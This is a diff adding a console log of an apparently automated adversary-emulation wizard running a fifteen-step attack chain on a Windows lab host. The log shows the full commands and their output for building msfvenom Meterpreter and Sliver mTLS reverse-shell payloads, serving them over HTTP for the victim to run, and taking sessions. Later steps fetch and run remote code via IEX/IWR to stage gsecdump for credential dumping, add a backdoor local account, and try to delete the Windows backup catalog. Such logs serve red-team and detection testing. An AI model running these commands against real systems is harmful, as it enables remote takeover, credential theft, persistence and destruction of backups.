@@ -1,0 +1,385 @@
+┌──(env_aurora-executor)─(kali㉿kali)-[~/Desktop/Aurora-executor-demo/run-20260713T163756Z-78114f34/chain-005]
+└─$ python attack_chain.py --params attack_chain.params.yml
+╭──────────────── Hello ────────────────╮
+│ 🎯 Welcome to Attack Execution Wizard │
+╰───────────── Let's Begin ─────────────╯
+
+📌[MSFVenom Console] Step 1
+
+📌[Name] Build the executable file of a Meterpreter session (for Windows) using MSFVenom
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the attacker machine
+➤ Enter value for LHOST (current: '192.168.56.43' , required: True): 
+ Parameter Input
+  Parameter: LPORT
+  Description: listening port of the attacter machine
+➤ Enter value for LPORT (current: 4444 , required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the generated payload
+➤ Enter value for SAVE_PATH (current: '/home/kali/Desktop/Aurora-executor-demo/msf_save/chain_mp.exe' , required: False): 
+
+[MSFVenom] Command to run:
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.43 LPORT=4444 -f exe -o /home/kali/Desktop/Aurora-executor-demo/msf_save/chain_mp.exe
+Run this MSFVenom command? [y/n] (y): 
+[MSFVenom] Running... (may take 5-10s)
+✓ MSFVenom payload generated successfully
+
+📌[Metasploit Executor] Step 2
+
+📌[Name] Set an MSF payload handler for a file-backed payload
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the attacker machine
+➤ Enter value for LHOST (current: '192.168.56.43' , required: False): 
+ Parameter Input
+  Parameter: LPORT
+  Description: listening port of the attacter machine
+➤ Enter value for LPORT (current: 4444 , required: False): 
+ Parameter Input
+  Parameter: payload_name
+  Description: payload type set by msf
+➤ Enter value for payload_name (current: 'windows/meterpreter/reverse_tcp' , required: False): 
+[*] Executing exploit=exploit/multi/handler payload=windows/meterpreter/reverse_tcp
+[+] Handler active — job 28: Exploit: multi/handler
+✓ Handler active — job 28, awaiting callback
+No active sessions found after 20s.
+
+📌[Human] Step 3
+
+📌[Name] Simulate the victim download and execute malicious payload file
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the http file server (typically the attacker machine)
+➤ Enter value for LHOST (current: '192.168.56.43' , required: True): 
+ Parameter Input
+  Parameter: LPORT
+  Description: port of the http file server
+➤ Enter value for LPORT (current: 8000 , required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the downloaded payload
+➤ Enter value for SAVE_PATH (current: 'C:\\Users\\Public\\chain_mp.exe' , required: True): 
+
+⚠ Human action required:
+╭──────────────────────────────────────────────────── Manual Step ─────────────────────────────────────────────────────╮
+│ (This step needs human interaction and (temporarily) cannot be executed automatically)                               │
+│ (On attacker's machine)                                                                                              │
+│ python -m http.server 8000                                                                                           │
+│                                                                                                                      │
+│ (On victim's machine)                                                                                                │
+│ 1. Open 192.168.56.43:8000 in the browser                                                                            │
+│ 2. Navigate to the path of the target payload file                                                                   │
+│ 3. Download the payload file                                                                                         │
+│ 4. Execute the payload file to C:\Users\Public\chain_mp.exe (If on a Linux machine, you also need to chmod the file) │
+│                                                                                                                      │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
+⏸  Have you completed this manual step? [y/n] (y): 
+
+📌[Session Check] Step 4
+📌[Name] Execute a Meterpreter Payload
+[Session Check] Polling for new meterpreter session (30s)…
+  Previously known sessions: (none)
+  Newly detected session(s):
+    [138] meterpreter — WIN-BASE\useradmin @ WIN-BASE (192.168.56.65:49851)
+➤ Session id to accept (default: 138, or 'n' to abort chain): 
+
+📌[Meterpreter Executor] Step 5
+
+📌[Name] ARP Cache Inspection
+ Parameter Input
+  Parameter: executor
+  Description: The Meterpreter session ID of the active Metasploit connection.
+  Select from available Meterpreter sessions:
+
+Available Meterpreter Sessions:
+[138] WIN-BASE\useradmin @ WIN-BASE
+Select session ID: 138
+Set the default session id as: 138!
+Selected meterpreter session: 138
+
+[Meterpreter Executor] Executing: arp
+Keep going with the next attack step? [y/n] (y): 
+
+ARP cache
+=========
+
+    IP address       MAC address        Interface
+    ----------       -----------        ---------
+    10.0.2.2         52:54:00:12:35:02  Intel(R) PRO/1000 MT Desktop Adapter #2
+    10.0.2.3         52:54:00:12:35:03  Intel(R) PRO/1000 MT Desktop Adapter #2
+    10.0.2.255       ff:ff:ff:ff:ff:ff  Intel(R) PRO/1000 MT Desktop Adapter #2
+    192.168.56.2     08:00:27:50:64:0c  Intel(R) PRO/1000 MT Desktop Adapter
+    192.168.56.43    08:00:27:b1:ea:51  Intel(R) PRO/1000 MT Desktop Adapter
+    192.168.56.255   ff:ff:ff:ff:ff:ff  Intel(R) PRO/1000 MT Desktop Adapter
+    224.0.0.22       00:00:00:00:00:00  Software Loopback Interface 1
+    224.0.0.22       01:00:5e:00:00:16  Intel(R) PRO/1000 MT Desktop Adapter
+    224.0.0.22       01:00:5e:00:00:16  Intel(R) PRO/1000 MT Desktop Adapter #2
+    224.0.0.251      01:00:5e:00:00:fb  Intel(R) PRO/1000 MT Desktop Adapter
+    224.0.0.251      01:00:5e:00:00:fb  Intel(R) PRO/1000 MT Desktop Adapter #2
+    224.0.0.252      01:00:5e:00:00:fc  Intel(R) PRO/1000 MT Desktop Adapter
+    224.0.0.252      01:00:5e:00:00:fc  Intel(R) PRO/1000 MT Desktop Adapter #2
+    239.255.255.250  00:00:00:00:00:00  Software Loopback Interface 1
+    239.255.255.250  01:00:5e:7f:ff:fa  Intel(R) PRO/1000 MT Desktop Adapter #2
+    255.255.255.255  ff:ff:ff:ff:ff:ff  Intel(R) PRO/1000 MT Desktop Adapter
+    255.255.255.255  ff:ff:ff:ff:ff:ff  Intel(R) PRO/1000 MT Desktop Adapter #2
+
+
+
+📌[Human] Step 6
+
+📌[Name] Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable as Admin
+ Parameter Input
+  Parameter: EXE_PATH
+  Description: Path of the executable the shortcut points at
+  ✓ Using stored value: C:\Users\Public\chain_mp.exe
+
+⚠ Human action required:
+╭────────────────────────────────────────────────────── Manual Step ───────────────────────────────────────────────────────╮
+│ (This step needs human interaction and (temporarily) cannot be executed automatically)                                   │
+│ (On victim's machine, on the desktop or a folder)                                                                        │
+│ Right-click a shortcut (.lnk) whose target is:                                                                           │
+│ C:\Users\Public\chain_mp.exe                                                                                             │
+│ then select "Run as administrator" (or open its Properties → Advanced → tick "Run as administrator", then double-click). │
+│                                                                                                                          │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
+⏸  Have you completed this manual step? [y/n] (y): 
+
+📌[Session Check] Step 7
+📌[Name] Execute a Meterpreter Payload
+[Session Check] Polling for new meterpreter session (30s)…
+  Previously known sessions: ['138']
+  Newly detected session(s):
+    [139] meterpreter — WIN-BASE\useradmin @ WIN-BASE (192.168.56.65:49853)
+➤ Session id to accept (default: 139, or 'n' to abort chain): 
+
+📌[Meterpreter Session Derive] Step 8
+📌[Name] Get an Interactive Shell on Windows
+ Parameter Input
+  Parameter: executor
+  Description: The Meterpreter session ID of the active Metasploit connection.
+  Select from available Meterpreter sessions:
+
+Available Meterpreter Sessions:
+[138] WIN-BASE\useradmin @ WIN-BASE
+[139] WIN-BASE\useradmin @ WIN-BASE
+Select session ID: 139
+Set the default session id as: 139!
+Selected meterpreter session: 139
+  ↳ Derived executor_derived executor from Meterpreter session 139
+
+📌[Sliver Console] Step 9
+
+📌[Name] Build the executable file of a Sliver implant (for Windows)
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the attacker machine
+➤ Enter value for LHOST (current: '192.168.56.43' , required: True): 
+ Parameter Input
+  Parameter: LPORT
+  Description: listening port of the attacter machine
+➤ Enter value for LPORT (current: 8443 , required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the generated payload
+➤ Enter value for SAVE_PATH (current: '/home/kali/Desktop/Aurora-executor-demo/sliver_save/chain_sl.exe' , required: True): 
+
+[Sliver Console] Commands to run (one per line, copy each separately):
+  sliver > generate --mtls 192.168.56.43:8443 --os windows --arch 64bit --format exe --save /home/kali/Desktop/Aurora-executor-demo/sliver_save/chain_sl.exe
+  sliver > mtls --lport 8443
+  ⚠ This step requires manual Sliver console interaction.
+Have you completed this Sliver console step? [y/n] (y): 
+
+📌[Human] Step 10
+
+📌[Name] Simulate the victim download and execute malicious payload file as Admin (Root)
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the http file server (typically the attacker machine)
+➤ Enter value for LHOST (current: '192.168.56.43' , required: True): 
+ Parameter Input
+  Parameter: LPORT
+  Description: port of the http file server
+➤ Enter value for LPORT (current: 8000 , required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the downloaded payload
+➤ Enter value for SAVE_PATH (current: 'C:\\Users\\Public\\chain_sl.exe' , required: True): 
+
+⚠ Human action required:
+╭───────────────────────────────────── Manual Step ──────────────────────────────────────╮
+│ (This step needs human interaction and (temporarily) cannot be executed automatically) │
+│ (On attacker's machine)                                                                │
+│ python -m http.server 8000                                                             │
+│                                                                                        │
+│ (On victim's machine)                                                                  │
+│ 1. Open 192.168.56.43:8000 in the browser                                              │
+│ 2. Navigate to the path of the target payload file                                     │
+│ 3. Download the payload file                                                           │
+│ 4. Execute the payload file to C:\Users\Public\chain_sl.exe as Admin (Root)            │
+│                                                                                        │
+╰────────────────────────────────────────────────────────────────────────────────────────╯
+⏸  Have you completed this manual step? [y/n] (y): 
+
+📌[Session Check] Step 11
+📌[Name] Execute a Sliver Implant Payload
+[Session Check] Polling for new sliver session (30s)…
+  Previously known sessions: (none)
+  Newly detected session(s):
+     BRIEF_BUN@WIN-BASE — WIN-BASE\useradmin (windows)
+➤ Session id to accept (default: d2679fe2-dade-43cd-ac43-59c12e0fd9d4, or 'n' to abort chain): 
+
+📌[Sliver Session Derive] Step 12
+📌[Name] Execute PowerShell Command
+ Parameter Input
+  Parameter: executor_parent
+  Description: The session ID of the active Sliver connection.
+Available Sessions:
+[0] d2679fe2-dade-43cd-ac43-59c12e0fd9d4 - BRIEF_BUN@WIN-BASE - WIN-BASE\useradmin(windows)
+Select session number: 0
+  ↳ Derived executor_derived executor from Sliver session d2679fe2-dade-43cd-ac43-59c12e0fd9d4
+
+📌[Powershell Executor] Step 13
+
+📌[Name] Gsecdump
+ Parameter Input
+  Parameter: executor
+  Description: The Powershell session ID used to invoke the prereq + main command.
+  ✓ Using stored value: d2679fe2-dade-43cd-ac43-59c12e0fd9d4
+ Parameter Input
+  Parameter: gsecdump_exe
+  Description: Local path on target where gsecdump binary should be staged and run.
+➤ Enter value for gsecdump_exe (current: 'C:\\Users\\Public\\gsecdump.exe' , required: True): 
+ Parameter Input
+  Parameter: gsecdump_url
+  Description: Download URL for the gsecdump-v2b5 binary (web archive).
+➤ Enter value for gsecdump_url (current: 'https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe' , 
+required: True): 
+ Parameter Input
+  Parameter: gsecdump_bin_hash
+  Description: Expected SHA256 of the gsecdump-v2b5.exe binary.
+➤ Enter value for gsecdump_bin_hash (current: '94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC' , required: True): 
+
+[Powershell Executor] PowerShell script to run via Sliver:
+  if (-not (Test-Path "C:\Users\Public\gsecdump.exe")) {
+  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+  $parentpath = Split-Path "C:\Users\Public\gsecdump.exe"
+  $binpath = "$parentpath\gsecdump-v2b5.exe"
+  New-Item -ItemType Directory $parentpath -Force | Out-Null
+  IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
+  if (Invoke-WebRequestVerifyHash "https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe" "$binpath" 
+"94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC") {
+    Move-Item $binpath "C:\Users\Public\gsecdump.exe"
+  }
+}
+& "C:\Users\Public\gsecdump.exe" -a
+
+
+Run this script? [y/n] (y): 
+[Powershell Executor] Running…
+Executing PowerShell script via -EncodedCommand (807 bytes)
+Status: 1
+Pid: 6968
+Stdout:
+File hash mismatch, expected: 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC, actual: E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855
+
+Stderr:
+#< CLIXML
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Exception calling "OpenRead" with "1" argument(s): "The request was aborted: The connection was closed unexpectedly."_x000D__x000A_</S><S S="Error">At line:7 char:9_x000D__x000A_</S><S S="Error">+         (New-Object System.Net.WebClient).OpenRead($url).copyto($ms)_x000D__x000A_</S><S S="Error">+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S="Error">    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : WebException_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S><Obj S="information" RefId="0"><TN RefId="0"><T>System.Management.Automation.InformationRecord</T><T>System.Object</T></TN><ToString>File hash mismatch, expected: 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC, actual: E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855</ToString><Props><Obj N="MessageData" RefId="1"><TN RefId="1"><T>System.Management.Automation.HostInformationMessage</T><T>System.Object</T></TN><ToString>File hash mismatch, expected: 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC, actual: E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855</ToString><Props><S N="Message">File hash mismatch, expected: 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC, actual: E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855</S><B N="NoNewLine">false</B><S N="ForegroundColor">Red</S><S N="BackgroundColor">DarkMagenta</S></Props></Obj><S N="Source">Write-Host</S><DT N="TimeGenerated">2026-07-17T20:29:27.7893176+00:00</DT><Obj N="Tags" RefId="2"><TN RefId="2"><T>System.Collections.Generic.List`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]</T><T>System.Object</T></TN><LST><S>PSHOST</S></LST></Obj><S N="User">WIN-BASE\useradmin</S><S N="Computer">WIN-BASE</S><U32 N="ProcessId">6968</U32><U32 N="NativeThreadId">2412</U32><U32 N="ManagedThreadId">7</U32></Props></Obj><S S="Error">&amp; : The term 'C:\Users\Public\gsecdump.exe' is not recognized as the name of a cmdlet, function, script file, or _x000D__x000A_</S><S S="Error">operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try _x000D__x000A_</S><S S="Error">again._x000D__x000A_</S><S S="Error">At line:12 char:3_x000D__x000A_</S><S S="Error">+ &amp; "C:\Users\Public\gsecdump.exe" -a_x000D__x000A_</S><S S="Error">+   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (C:\Users\Public\gsecdump.exe:String) [], CommandNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : CommandNotFoundException_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  ✗ Step 13 failed: Gsecdump
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+PowerShell script exited with Status=1. See Stderr above for the failing line/statement.
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+
+📌[Command Prompt Executor] Step 14
+
+📌[Name] Create a new user in a command prompt
+ Parameter Input
+  Parameter: executor
+  Description: The Command Prompt session ID used to invoke net user.
+  ✓ Using stored value: 139
+ Parameter Input
+  Parameter: username
+  Description: Local account name to create.
+➤ Enter value for username (current: 'AuroraSvc005' , required: True): 
+ Parameter Input
+  Parameter: password
+  Description: Password for the new account.
+➤ Enter value for password (current: 'CplexPass!23' , required: True): 
+
+[Command Prompt Executor] Command to run via Meterpreter:
+  net user /add "AuroraSvc005" "CplexPass!23"
+
+Run this command? [y/n] (y): 
+[Command Prompt Executor] Running…
+Executing: net user /add "AuroraSvc005" "CplexPass!23"
+Output:
+The command completed successfully.
+
+
+📌[Command Prompt Executor] Step 15
+
+📌[Name] Windows - wbadmin Delete Windows Backup Catalog
+ Parameter Input
+  Parameter: executor
+  Description: The Command Prompt session ID used to invoke wbadmin.
+  ✓ Using stored value: 139
+
+[Command Prompt Executor] Command to run via Meterpreter:
+  wbadmin delete catalog -quiet
+
+Run this command? [y/n] (y): 
+[Command Prompt Executor] Running…
+Executing: wbadmin delete catalog -quiet
+Output:
+'wbadmin' is not recognized as an internal or external command,
+operable program or batch file.
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  ✗ Step 15 failed: Windows - wbadmin Delete Windows Backup Catalog
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+1/1 command(s) failed in meterpreter shell channel:
+  [1] 'wbadmin delete catalog -quiet': cmd exit code 9009
+      'wbadmin' is not recognized as an internal or external command,
+      operable program or batch file.
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+
+══════════════════════════════════════════════════════════════════════
+  Attack Chain Run Summary
+══════════════════════════════════════════════════════════════════════
+Step  Name                                                                                  Start                    End                      Duration  Status
+   1  Build the executable file of a Meterpreter session (for Windows) using MSFVenom       2026-07-17 20:39:11 UTC  2026-07-17 20:39:21 UTC      9.7s    ✓   
+   2  Set an MSF payload handler for a file-backed payload                                  2026-07-17 20:39:21 UTC  2026-07-17 20:41:09 UTC    1m 48s    ✓   
+   3  Simulate the victim download and execute malicious payload file                       2026-07-17 20:41:09 UTC  2026-07-17 20:42:24 UTC    1m 14s    ✓   
+   4  Execute a Meterpreter Payload                                                         2026-07-17 20:42:24 UTC  2026-07-17 20:42:27 UTC      3.2s    ✓   
+   5  ARP Cache Inspection                                                                  2026-07-17 20:42:27 UTC  2026-07-17 20:42:32 UTC      5.0s    ✓   
+   6  Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable  2026-07-17 20:42:32 UTC  2026-07-17 20:42:58 UTC     26.2s    ✓   
+      as Admin                                                                                                                                                
+   7  Execute a Meterpreter Payload                                                         2026-07-17 20:42:58 UTC  2026-07-17 20:43:01 UTC      3.0s    ✓   
+   8  Get an Interactive Shell on Windows                                                   2026-07-17 20:43:01 UTC  2026-07-17 20:43:04 UTC      3.2s    ✓   
+   9  Build the executable file of a Sliver implant (for Windows)                           2026-07-17 20:43:04 UTC  2026-07-17 20:43:35 UTC     30.7s    ✓   
+  10  Simulate the victim download and execute malicious payload file as Admin (Root)       2026-07-17 20:43:35 UTC  2026-07-17 20:43:52 UTC     17.3s    ✓   
+  11  Execute a Sliver Implant Payload                                                      2026-07-17 20:43:52 UTC  2026-07-17 20:43:58 UTC      5.2s    ✓   
+  12  Execute PowerShell Command                                                            2026-07-17 20:43:58 UTC  2026-07-17 20:44:01 UTC      3.1s    ✓   
+  13  Gsecdump                                                                              2026-07-17 20:44:01 UTC  2026-07-17 20:44:12 UTC     11.0s    ✗   
+  14  Create a new user in a command prompt                                                 2026-07-17 20:44:12 UTC  2026-07-17 20:44:21 UTC      9.3s    ✓   
+  15  Windows - wbadmin Delete Windows Backup Catalog                                       2026-07-17 20:44:21 UTC  2026-07-17 20:44:29 UTC      8.3s    ✗   
+
+  Failed steps (2):
+  ✗ Step 13: Gsecdump
+      PowerShell script exited with Status=1. See Stderr above for the failing line/statement.
+  ✗ Step 15: Windows - wbadmin Delete Windows Backup Catalog
+      1/1 command(s) failed in meterpreter shell channel:
+        [1] 'wbadmin delete catalog -quiet': cmd exit code 9009
+            'wbadmin' is not recognized as an internal or external command,
+            operable program or batch file.
+
+  Total: 15 steps executed (13 ✓, 0 ?, 2 ✗) in 5m 18s
+══════════════════════════════════════════════════════════════════════
